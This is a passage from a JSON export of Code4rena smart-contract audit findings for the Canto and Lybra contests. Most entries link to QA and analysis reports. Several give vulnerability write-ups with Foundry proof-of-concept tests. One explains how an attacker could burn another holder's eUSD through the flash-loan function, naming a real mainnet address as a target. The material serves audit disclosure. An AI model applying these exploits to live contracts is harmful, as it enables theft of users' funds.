[here](https://github.com/code-423n4/2023-06-lukso-findings/blob/main/data/gpersoon-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-canto-findings/issues/98", "labels": ["analysis-advanced", "grade-a", "high quality report", "satisfactory", "sponsor confirmed", "A-01"], "target": "2023-06-canto-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-canto-findings/blob/main/data/0xSmartContract-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-canto-findings/issues/64", "labels": ["analysis-advanced", "grade-a", "high quality report", "satisfactory", "sponsor confirmed", "A-02"], "target": "2023-06-canto-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-canto-findings/blob/main/data/Udsen-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-canto-findings/issues/61", "labels": ["analysis", "grade-a", "high quality report", "sponsor confirmed"], "target": "2023-06-canto-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-canto-findings/blob/main/data/dontonka-Analysis.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-canto-findings/issues/59", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-06-canto-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-canto-findings/blob/main/data/DevABDee-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-canto-findings/issues/46", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-06"], "target": "2023-06-canto-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-canto-findings/blob/main/data/squeaky_cactus-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-canto-findings/issues/40", "labels": ["analysis-advanced", "grade-a", "high quality report", "satisfactory", "sponsor confirmed", "A-03"], "target": "2023-06-canto-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-canto-findings/blob/main/data/kutugu-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-canto-findings/issues/21", "labels": ["analysis-advanced", "grade-a", "high quality report", "satisfactory", "selected for report", "sponsor confirmed", "A-04"], "target": "2023-06-canto-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-canto-findings/blob/main/data/0xNightRaven-Analysis.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/979", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/naman1778-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/948", "labels": ["analysis-advanced", "grade-a", "high quality report", "satisfactory", "sponsor confirmed", "A-01"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/MrPotatoMagic-Analysis.md)."}, {"title": "Wrong `proposalThreshold` amount in `LybraGovernance.sol`", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/942", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/governance/LybraGovernance.sol#L172-L174   # Vulnerability details  ## Impact  The proposal can be created with only 100_000 esLBR delegated instead of 10_000_000.  ## Proof of Concept  According to [LybraV2Docs](https://docs.lybra.finance/lybra-v2-technical-beta/governance/process/propose#threshold), a proposal can only be created if the sender has at least 10 million esLBR tokens delegated to his address to meet the proposal threshold.  In [LybraGovernance.sol#L172-L174](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/governance/LybraGovernance.sol#L172-L174) the proposal threshold is set to only `1e23` which equals to `100_000` as esLBR has 18 decimals. ```     function proposalThreshold() public pure override returns (uint256) {         return 1e23;     } ``` [LybraGovernance.sol#L172-L174](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/governance/LybraGovernance.sol#L172-L174)   ## Tools Used Manual Review  ## Recommended Mitigation Steps In [LybraGovernance.sol#L173](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/governance/LybraGovernance.sol#L173) replace `1e23` with `1e25`  Alternatively, the team can update the documentation stating that it is only required 100_000 esLBR tokens (0.1% of the total LBR supply) delegated to meet the proposal threshold.    ## Assessed type  Math"}, {"title": "Impossibility to change `safeCollateralRatio`", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/882", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L199 https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L30 https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L18   # Vulnerability details  ## Impact Because of `vaultType` variable is internal `vaultType` staticcall to vaults from the configurator will revert, so it makes it impossible to change `safeCollateralRatio`. It may be critical when market conditions will change, something happens with ETH.   ## Proof of Concept ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; import {GovernanceTimelock} from \"@lybra/governance/GovernanceTimelock.sol\"; import {LybraStETHDepositVault} from \"@lybra/pools/LybraStETHVault.sol\"; import {Configurator} from \"@lybra/configuration/LybraConfigurator.sol\"; import {mockEtherPriceOracle} from \"@mocks/mockEtherPriceOracle.sol\"; import {mockCurve} from \"@mocks/mockCurve.sol\";  /* remappings used @lybra=contracts/lybra/ @mocks=contracts/mocks/  */ contract LybraV2SafeCollateral is Test {      GovernanceTimelock govTimeLock;     mockEtherPriceOracle oracle;     mockCurve curve;     Configurator configurator;     LybraStETHDepositVault stETHVault;     address owner = address(7);     // admins && executers of GovernanceTimelock     address[] govTimelockArr;     IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);      function setUp() public {         vm.startPrank(owner);         oracle = new mockEtherPriceOracle();         govTimelockArr.push(owner);         govTimeLock = new GovernanceTimelock(             1,             govTimelockArr,             govTimelockArr,             owner         );         curve = new mockCurve();         //  _dao , _curvePool         configurator = new Configurator(address(govTimeLock), address(curve));          stETHVault = new LybraStETHDepositVault(             address(configurator),             address(stETH),             address(oracle)         );         vm.stopPrank();     }      function testSafeCollateral() public {         vm.startPrank(owner);         configurator.setSafeCollateralRatio(address(stETHVault), 165 * 1e18);     }       } ```  ## Tools Used Foundry  ## Recommended Mitigation Steps Change getter function in `LybraConfigurator`: ```solidity interface IVault {     function getVaultType() external view returns (uint8); } ... ... if(IVault(pool).getVaultType() == 0) { ``` https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L29  https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L199   ## Assessed type  DoS"}, {"title": "The EUSDMiningIncentives contract is incorrectly implemented and can allow for more than the intended amount of rewards to be minted", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/867", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L132-L134 https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/EUSDMiningIncentives.sol#L136-L147   # Vulnerability details  ## Impact  The EUSDMiningIncentives contract is intended to function similarly to the Synthetix staking rewards contract. This means that the rewards per second, defined as `rewardRatio`, which is set in the `notifyRewardAmount` function, is supposed to be distributed to users as an equivalent percentage of how much the user has staked as compared to the total amount staked. In this contract, the total amount staked is equal to the total supply of EUSD tokens. However, the calculated amount staked PER user is equal to the total amount borrowed of tokens (EUSD and PeUSD) across ALL vaults. This means that the amount returned by the `totalStaked` function is wrong, as it should also include the total supply of all the vaults which are included in the `pools` array (EUSD and PeUSD). This will effectively result in much more than the intended amount of rewards to be minted, as the numerator (total amount of EUSD and PeUSD) across all users is much more than the denominator (total amount of EUSD).  ## Proof of Concept  First consider the `stakedOf` function, which sums up the borrowed amount across all vaults in the `pools` array (both EUSD and PeUSD): ```solidity function stakedOf(address user) public view returns (uint256) {     uint256 amount;     for (uint i = 0; i < pools.length; i++) {         ILybra pool = ILybra(pools[i]);         uint borrowed = pool.getBorrowedOf(user);         if (pool.getVaultType() == 1) {             borrowed = borrowed * (1e20 + peUSDExtraRatio) / 1e20;         }         amount += borrowed;     }     return amount; } ``` Then consider the `totalStaked` function, which just returns the total supply of EUSD: ```solidity function totalStaked() internal view returns (uint256) {     return EUSD.totalSupply(); } ``` The issue arrises in the `earned` function which references both the `stakedOf` value and the `totalSupply` value: ```solidity function earned(address _account) public view returns (uint256) { // @note - read     return ((stakedOf(_account) * getBoost(_account) * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e38) + rewards[_account]; } ``` Here, `stakedOf` (which includes EUSD and PeUSD), is multiplied by a call to `rewardPerToken` minus the old user reward debt. This function has `totalStaked()` in the denominator, which is where this skewed calculation is occurring: ```solidity function rewardPerToken() public view returns (uint256) {  ...  return rewardPerTokenStored + (rewardRatio * (lastTimeRewardApplicable() - updatedAt) * 1e18) / totalStaked(); } ``` This will effectively result in much more than the intended amount of rewards to be minted to the users, which will result in the supply of esLBR inflating much faster than intended.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  The `totalStaked` function should be updated to sum up the totalSupply of EUSD and all the PeUSD vaults which are in the `pools` array.   ## Assessed type  Math"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/856", "labels": ["analysis-advanced", "grade-a", "satisfactory", "sponsor confirmed", "A-02"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/K42-Analysis.md)."}, {"title": "Invalid implementation of prioritized token rewards distribution", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/828", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L190-L218 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L209   # Vulnerability details  ## Vulnerability Details The `getReward` external function can't calculate and distribute rewards correctly for an account because of the reasons below: - Transferring EUSD while the contract EUSD balance is insufficient and reverting - Bad implementation of prioritized token rewards distribution when converting reward decimal for transfer stablecoin  ## Impact Users can't get rewards and rewards freezes.  ## Proof of Concept  ```solidity // SPDX-License-Identifier: MIT  pragma solidity ^0.8.17;  import {Test, console} from \"forge-std/Test.sol\"; import {GovernanceTimelock} from \"contracts/lybra/governance/GovernanceTimelock.sol\"; import {mockCurve} from \"contracts/mocks/mockCurve.sol\"; import {Configurator} from \"contracts/lybra/configuration/LybraConfigurator.sol\"; import {LybraWBETHVault} from \"contracts/lybra/pools/LybraWbETHVault.sol\"; import {PeUSDMainnet} from \"contracts/lybra/token/PeUSDMainnetStableVision.sol\"; import {ProtocolRewardsPool} from \"contracts/lybra/miner/ProtocolRewardsPool.sol\"; import {EUSDMock} from \"contracts/mocks/MockEUSD.sol\"; import {LBR} from \"contracts/lybra/token/LBR.sol\"; import {esLBR} from \"contracts/lybra/token/esLBR.sol\"; import {esLBRBoost} from \"contracts/lybra/miner/esLBRBoost.sol\"; import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";  // 6 decimal USDC mock contract mockUSDC is ERC20 {     constructor() ERC20(\"USDC\", \"USDC\") {         _mint(msg.sender, 1000000 * 1e6);     }      function claim() external returns (uint256) {         _mint(msg.sender, 10000 * 1e6);         return 10000 * 1e6;     }      function decimals() public view virtual override returns (uint8) {         return 6;     } }  contract ProtocolRewardsPoolTest is Test {     address goerliEndPoint = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;     address wbETH = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;     address deployer;     address attacker;     address alice;      address[] proposers;     address[] executors;     address[] minerContracts;     bool[] minerContractsBools;      GovernanceTimelock governance;     mockCurve curvePool;     Configurator configurator;     PeUSDMainnet peUsdMainnet;     EUSDMock eUSD;     mockUSDC usdc;     LBR lbr;     esLBR eslbr;     esLBRBoost boost;     LybraWBETHVault wbETHVault;     ProtocolRewardsPool rewardsPool;      function setUp() public {         deployer = makeAddr(\"deployer\");         attacker = makeAddr(\"attacker\");         alice = makeAddr(\"alice\");         vm.startPrank(deployer);         proposers.push(deployer);         executors.push(deployer);         governance = new GovernanceTimelock(2, proposers, executors, deployer);         curvePool = new mockCurve();         configurator = new Configurator(address(governance), address(curvePool));         peUsdMainnet = new PeUSDMainnet(             address(configurator),             8,             goerliEndPoint         );         eUSD = new EUSDMock(address(configurator));         // 6 decimal USDC token         usdc = new mockUSDC();         lbr = new LBR(address(configurator), 8, goerliEndPoint);         eslbr = new esLBR(address(configurator));         boost = new esLBRBoost();         rewardsPool = new ProtocolRewardsPool(address(configurator));         rewardsPool.setTokenAddress(address(eslbr), address(lbr), address(boost));         // Ether oracle has no impact on this test         wbETHVault =         new LybraWBETHVault(address(peUsdMainnet), makeAddr(\"NonImportantMockForEtherOracle\"), wbETH, address(configurator));         configurator.setMintVault(deployer, true);         configurator.initToken(address(eUSD), address(peUsdMainnet));         configurator.setProtocolRewardsPool(address(rewardsPool));         configurator.setProtocolRewardsToken(address(usdc));         curvePool.setToken(address(eUSD), address(usdc));          // Set minters         minerContracts.push(address(deployer));         minerContracts.push(address(rewardsPool));         minerContractsBools.push(true);         minerContractsBools.push(true);         configurator.setTokenMiner(minerContracts, minerContractsBools);          // Fund curve pool eusd/usdc         eUSD.mint(address(curvePool), 10000 * 1e18);         usdc.transfer(address(curvePool), 10000 * 1e6);          // Fund ALice         lbr.mint(address(alice), 100 * 1e18);         vm.stopPrank();     }      function test_canGetReward() public {         // Alice stake LBR         vm.startPrank(alice);         rewardsPool.stake(100 * 1e18);         assertEq(eslbr.balanceOf(alice), 100 * 1e18);         vm.stopPrank();          // Notify reward amount         vm.startPrank(deployer);         eUSD.mint(address(configurator), 3000 * 1e18);         configurator.setPremiumTradingEnabled(true);          uint256 eusdPreBalance = eUSD.balanceOf(address(configurator));         configurator.distributeRewards();         curvePool.setPrice(1010000);         uint256 price = curvePool.get_dy_underlying(0, 2, 1e18);         uint256 outUSDC = eusdPreBalance * price * 998 / 1e21;         assertEq(eUSD.sharesOf(address(rewardsPool)), 0);         assertEq(usdc.balanceOf(address(rewardsPool)), outUSDC);          configurator.distributeRewards();         vm.stopPrank();          uint256 newRewardPerTokenstored =             outUSDC * 1e36 / (10 ** ERC20(configurator.stableToken()).decimals()) / eslbr.totalSupply();          assertEq(rewardsPool.rewardPerTokenStored(), newRewardPerTokenstored);         assertEq(rewardsPool.earned(alice), eslbr.balanceOf(alice) * (newRewardPerTokenstored - 0) / 1e18);         uint256 earnedUSDC = rewardsPool.earned(alice);          vm.startPrank(alice);         rewardsPool.getReward();         // earnedUSDC / 1e12 -> Because rewardsPool.earned output has 18 decimal and USDC has 6 decimals         assertEq(usdc.balanceOf(alice), earnedUSDC / 1e12);         vm.stopPrank();     } }  ```  ## Tools Used - Foundry      ## Assessed type  Math"}, {"title": "Allowing `refreshReward()` to fail during minting or buring esLBR could result in gain or loss previously earned reward", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/794", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L33 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L40   # Vulnerability details  ## Impact The `esLBR` balance of users plays the most important role in staking reward calculation. Using a try-catch statement over `refreshReward()` in the `esLBR.mint()` and `esLBR.burn()` functions can have the following effects when `refreshReward()` become unavailable: * Users can mint more `esLBR`, then manually call `refreshReward()` afterward for the contract to record the earned reward with the increased `esLBR` balance of the users. This results in users receiving more rewards than they should. * Users can be back run by a searcher or someone else calling `refreshReward(victim)` for the contract to record the earned reward with the decreased `esLBR` balance of the users. This results in users losing some of their rightful pending rewards that have not yet been recorded to the latest timestamp.  ## Proof of Concept The following is the coded PoC using [Foundry](https://github.com/foundry-rs/foundry).  **Note:** This PoC creates a mock reward contract. It has the same logic as the real one, but with added setter functions that serve only to simplify the test flow. ```solidity File: test/esLBR.t.sol  // SPDX-License-Identifier: Unlicensed  pragma solidity ^0.8.17;  import \"forge-std/Test.sol\"; import \"contract/lybra/configuration/LybraConfigurator.sol\"; import \"contract/lybra/governance/GovernanceTimelock.sol\"; import {esLBR} from \"contract/lybra/token/esLBR.sol\";  contract C4esLBRTest is Test {     Configurator configurator;     GovernanceTimelock govTimelock;     mockProtocolRewardsPool rewardsPool;     esLBR eslbr;      address exploiter = address(0xfff);     address victim = address(0xeee);      function setUp() public {         govTimelock = new GovernanceTimelock(0, new address[](0), new address[](0), address(0));         configurator = new Configurator(address(govTimelock), address(0));         rewardsPool = new mockProtocolRewardsPool();         eslbr = new esLBR(address(configurator));          rewardsPool.setTokenAddress(address(eslbr));          address[] memory minter = new address[](1);         minter[0] = address(this);         bool[] memory minterBool = new bool[](1);         minterBool[0] = true;         configurator.setTokenMiner(minter, minterBool); // set this contract as the esLBR minter         configurator.setProtocolRewardsPool(address(rewardsPool));          eslbr.mint(exploiter, 100 ether);         eslbr.mint(victim, 100 ether);         rewardsPool.setRewardPerTokenStored(1);     }      function testMintFailRefreshReward() public {         assertEq(eslbr.balanceOf(exploiter), eslbr.balanceOf(victim), \"Should start with equal esLBR balance\");         assertEq(rewardsPool.earned(exploiter), rewardsPool.earned(victim), \"Should start with equal rewards accrued\");          rewardsPool.setRewardPerTokenStored(2);          eslbr.mint(victim, 100 ether); // refreshReward should pass         rewardsPool.forceRevert(true); // Assume something occur, causing the refreshReward become unavailable         eslbr.mint(exploiter, 100 ether);          // Record earning rewards to latest rate         rewardsPool.forceRevert(false);         rewardsPool.refreshReward(exploiter);         rewardsPool.refreshReward(victim);          assertGt(rewardsPool.earned(exploiter), rewardsPool.earned(victim), \"Exploiter should have more reward by this flaw\");     }      function testBurnFailRefreshReward() public {         assertEq(eslbr.balanceOf(exploiter), eslbr.balanceOf(victim), \"Should start with equal esLBR balance\");         assertEq(rewardsPool.earned(exploiter), rewardsPool.earned(victim), \"Should start with equal rewards accrued\");          rewardsPool.forceRevert(true); // Assume something occur, causing the refreshReward become unavailable         eslbr.burn(victim, 100 ether); // The victim unstake during that time          // Record earning rewards to latest rate         rewardsPool.forceRevert(false);         rewardsPool.refreshReward(exploiter);         rewardsPool.refreshReward(victim);          assertGt(rewardsPool.earned(exploiter), rewardsPool.earned(victim), \"Victim should loss earned rewards by this flaw\");     } }  contract mockProtocolRewardsPool {     esLBR public eslbr;      // Sum of (reward ratio * dt * 1e18 / total supply)     uint public rewardPerTokenStored;     // User address => rewardPerTokenStored     mapping(address => uint) public userRewardPerTokenPaid;     // User address => rewards to be claimed     mapping(address => uint) public rewards;      bool isForceRevert; // for mockup reverting on refreshreward      function setTokenAddress(address _eslbr) external {         eslbr = esLBR(_eslbr);     }      // User address => esLBR balance     function stakedOf(address staker) internal view returns (uint256) {         return eslbr.balanceOf(staker);     }      function earned(address _account) public view returns (uint) {         return ((stakedOf(_account) * (rewardPerTokenStored - userRewardPerTokenPaid[_account])) / 1e18) + rewards[_account];     }      /**      * @dev Call this function when deposit or withdraw ETH on Lybra and update the status of corresponding user.      */     modifier updateReward(address account) {         if (isForceRevert) revert();         rewards[account] = earned(account);         userRewardPerTokenPaid[account] = rewardPerTokenStored;         _;     }      function refreshReward(address _account) external updateReward(_account) {}      function forceRevert(bool _isForce) external {         isForceRevert = _isForce;     }      function setRewardPerTokenStored(uint value) external {         rewardPerTokenStored = value;     } } ```  The test should pass without errors. ```shell Running 2 tests for test/esLBR.t.sol:C4esLBRTest [PASS] testBurnFailRefreshReward() (gas: 141678) [PASS] testMintFailRefreshReward() (gas: 188308) Test result: ok. 2 passed; 0 failed; finished in 2.50ms ```  Please follow this [gist](https://gist.github.com/t-nero/e97d8b9c7c5067b1638fe2b929b45456) if you prefer my instruction on how I setup the contest repo with Foundry environment.  ## Tools Used * Manual review * Foundry  ## Recommended Mitigation Steps The `refreshReward()` function should be a mandatory action inside either the `mint()` or `burn()` functions. The try-catch statement should be removed.   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/790", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-12"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/3agle-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/772", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-14"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/codetilda-Q.md)."}, {"title": "There is a vulnerability in the executeFlashloan function of the PeUSDMainnet contract. Hackers can use this vulnerability to burn other people's eUSD token balance without permission", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/769", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-01"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/PeUSDMainnetStableVision.sol#L129-L139 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/EUSD.sol#L228-L230   # Vulnerability details  ## Impact The `executeFlashloan` function of the `PeUSDMainnet` contract is used to provide users with the flash loan function. There is a loophole in the logic, and hackers can use this loophole to burn other people's eUSD token balance without permission.  ## Proof of Concept Since the parameter `FlashBorrower receiver` of the executeFlashloan function can be designated as anyone, the flash loan system will charge a certain percentage of the loan fee (up to 10%) to `receiver` for each flash loan, the code is as follows: ``` EUSD.burnShares(address(receiver), burnShare); ``` When a hacker maliciously initiates a flash loan for a `receiver` contract, and the value of the `eusdAmount` parameter passed in is large enough, the `receiver` will be deducted a large amount of loan fees, and the hacker can burn a large amount of other people\u2019s eUSD without permission the amount.  Let us analyze the design logic of the system itself step by step for discussion: 1. The flashloan fee of the `PeUSDMainnet` contract is collected by calling the `burnShares` function of the `EUSD` contract. Continue to read the code to find that the `burnShares` function of the `EUSD` contract has a very critical `modifier onlyMintVault` condition Judgment, so it is obvious that the `PeUSDMainnet` contract is the minter role of the `EUSD` contract (otherwise it will not be able to charge the flashloan fee).  2. Usually, when the `transferFrom` function is called, the ERC20 token needs to be approved by the spender before it can be used. But the transferFrom function in the `EUSD` contract is implemented like this: ``` function transferFrom(address from, address to, uint256 amount) public returns (bool) {      address spender = _msgSender();      if (!configurator. mintVault(spender)) {          _spendAllowance(from, spender, amount);      }      _transfer(from, to, amount);      return true; } ``` The above code indicates that the miner of EUSD can call `transferFrom` arbitrarily without the user calling `increaseAllowance` for approval. The `PeUSDMainnet` contract is the minter of the `EUSD` contract, so line 133 of the `PeUSDMainnet` contract code: `bool success = EUSD.transferFrom(address(receiver), address(this), EUSD.getMintedEUSDByShares(shareAmount));` can be executed without user approval.  3. In line 132 of the `executeFlashloan` function of the `PeUSDMainnet` contract: `receiver.onFlashLoan(shareAmount, data);`, if the `receiver` does not implement the `onFlashLoan` method, the EVM will revert, and the hacker will not be able to maliciously execute the attack. However, if the receiver contract simply declares the `fallback()` function, or its fallback() logic does not have a very robust judgment, then line 132 of the code can be easily bypassed. So is there really such a contract that just satisfies this condition? The answer is yes, for example this address: `0x32034276343de43844993979e5384d4b7e030934` ( etherscan: https://etherscan.io/address/0x32034276343de43844993979e5384d4b7e030934#code ), this address has 200,000 eUSD tokens, and declared the fallback function, its source code excerpts are as follows:  ```solidity contract GnosisSafeProxy {     // singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.     // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`     address internal singleton;      /// @dev Constructor function sets address of singleton contract.     /// @param _singleton Singleton address.     constructor(address _singleton) {         require(_singleton != address(0), \"Invalid singleton address provided\");         singleton = _singleton;     }      /// @dev Fallback function forwards all transactions and returns all received return data.     fallback() external payable {         // solhint-disable-next-line no-inline-assembly         assembly {             let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)             // 0xa619486e == keccak(\"masterCopy()\"). The value is right padded to 32-bytes with 0s             if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {                 mstore(0, _singleton)                 return(0, 0x20)             }             calldatacopy(0, 0, calldatasize())             let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)             returndatacopy(0, 0, returndatasize())             if eq(success, 0) {                 revert(0, returndatasize())             }             return(0, returndatasize())         }     } } ```  4. Assuming that the `PeUSDMainnet` contract flash loan fee rate is 5% at this time, the hacker maliciously calls the `executeFlashloan` function to initiate a flash loan with the address: `0x32034276343de43844993979e5384d4b7e030934`, the function parameter `uint256 eusdAmount = 4_000_000`, and the calculated loan fee  is` 4_000_000 * 5% = 200_000`, the 200_000 eUSD balance of the address `0x32034276343de43844993979e5384d4b7e030934` will be maliciously burned by hackers!  The following is the forge test situation I simulated locally ``` [PASS] testGnosisSafeProxy() (gas: 10044) Traces:   [10044] AttackTest::testGnosisSafeProxy()      \u251c\u2500 [4844] GnosisSafeProxy::onFlashLoan()      \u2502   \u251c\u2500 [0] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::onFlashLoan() [delegatecall]     \u2502   \u2502   \u2514\u2500 \u2190 ()     \u2502   \u2514\u2500 \u2190 ()     \u2514\u2500 \u2190 ()  Test result: ok. 1 passed; 0 failed; finished in 972.63\u00b5s ``` The fallback function of the GnosisSafeProxy contract is allowed to be called without revert.  ## Tools Used  Visual Studio Code Foundry   ## Recommended Mitigation Steps  Optimize the flash loan logic of the `executeFlashloan` function of the `PeUSDMainnet` contract, remove the `FlashBorrower receiver`parameter, and set `receiver` to `msg.sender`, which means that a user can only initiate a flash loan for himself.      ## Assessed type  Other"}, {"title": "doesn't calculate the current borrowing amount for the provider, including the provider's borrowed shares and accumulated fees due to Inconsistency in collateralRatio calculation", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/723", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L127 https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L161   # Vulnerability details  ## Impact doesn't calculate the current borrowing amount for the provider, including the provider's borrowed shares and accumulated fees.  ## Proof of Concept Borrowers collateralRatio in the liquidation() function is calculated by: ```solidity uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / getBorrowedOf(onBehalfOf); ``` notice it calls the *getBorrowedOf()* function, which calculate the current borrowing amount for the borrower, including the borrowed shares and accumulated fees and not just the borrowed amount https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L253 ```solidity function getBorrowedOf(address user) public view returns (uint256) {         return borrowed[user] + feeStored[user] + _newFee(user);     } ``` However, the providers collateralRatio in the rigidRedemption() function is calculated by: https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L161 ```solidity uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider]; ``` here the deposit asset is divided by just the borrowed amount, missing out the borrowed shares and accumulated fees ## Tools Used Visual Studio Code  ## Recommended Mitigation Steps Be consistent with collateralRatio calculation   ## Assessed type  Other"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/714", "labels": ["analysis-advanced", "grade-b", "satisfactory", "sponsor confirmed", "A-04"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/solsaver-Analysis.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/706", "labels": ["bug", "grade-a", 